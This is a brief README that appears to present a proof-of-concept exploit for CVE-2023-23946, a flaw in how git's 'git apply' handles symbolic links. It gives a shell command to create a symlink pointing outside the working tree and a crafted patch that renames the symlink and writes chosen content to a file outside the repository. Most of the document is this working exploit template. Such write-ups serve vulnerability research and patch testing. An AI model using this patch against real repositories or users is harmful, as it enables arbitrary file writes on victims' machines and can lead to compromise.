# CVE-2023-23946 POC Exploit
Explanation and POC of the CVE-2023-23946

The CVE-2023-23946 vulnerability is caused by a flaw in the way git handles symbolic links. When git creates a symbolic link, it doesnt actually handle it as a symbolic link and because of that we can exploit it to point to files outside of the working tree.


# First create a symlink
```
ln -s [PATH_YOU_WANT_TO_ACCESS_OUTSITE_WORKING_TREE] symlink
```
# Now create a patch to use with the git apply

```
diff --git a/symlink b/newsymlink
rename from symlink
rename to newsymlink
--
diff --git /dev/null b/newsymlink/spawn
new file mode 100644
index 0000000..e47f4ea
--- /dev/null
+++ b/newsymlink/[FILE_OUTSIDE]
@@ -0,0 +1 @@
+[WHAT_YOU_WANT_INSIDE_THE_FILE]
\ No newline at end of file
```

What does the patch do? We change the name of the existing symbolic link and create a new file. This way, when we modify /newsymlink/[FILE_OUTSIDE] git does not apply its protections against symbolic links.
